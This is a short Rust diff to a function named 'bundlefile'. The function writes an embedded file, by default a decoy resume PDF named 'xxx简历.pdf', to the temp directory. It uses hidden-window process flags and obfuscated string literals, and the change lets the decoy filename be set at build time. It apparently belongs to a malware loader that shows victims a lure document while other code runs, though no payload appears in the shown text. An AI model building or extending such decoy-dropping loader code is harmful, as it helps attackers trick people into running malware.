@@ -3,18 +3,25 @@ use std::os::windows::process::CommandExt;
 use tempfile::NamedTempFile;
 use rustcrypt_ct_macros::obf_lit;
 
+// Include the generated bundle data
+include!("bundle_data.rs");
+
 #[allow(dead_code)]
 pub fn bundlefile() {
-
-    const MEMORY_FILE: &[u8] = include_bytes!("../../bundle/xxx简历.pdf");
     const CREATE_NO_WINDOW: u32 = 0x08000000;
 
+    // Use compile-time environment variable for filename
+    const ORIGINAL_FILE_NAME: &str = env!("RSL_BUNDLE_FILENAME");
+    let original_file_name = if ORIGINAL_FILE_NAME.is_empty() {
+        "xxx简历.pdf"
+    } else {
+        ORIGINAL_FILE_NAME
+    };
+    
     let mut temp_file = NamedTempFile::new().unwrap();
-    let original_file_name = obf_lit!("xxx简历.pdf"); // 原始文件名
-    let _file_extension = obf_lit!("pdf"); // 文件后缀名
     
     let temp_dir = temp_file.path().parent().unwrap();
-    let temp_file_path = temp_dir.join(original_file_name);
+    let temp_file_path = temp_dir.join(&original_file_name);
 
     temp_file.write_all(MEMORY_FILE).unwrap();
     temp_file.flush().unwrap();
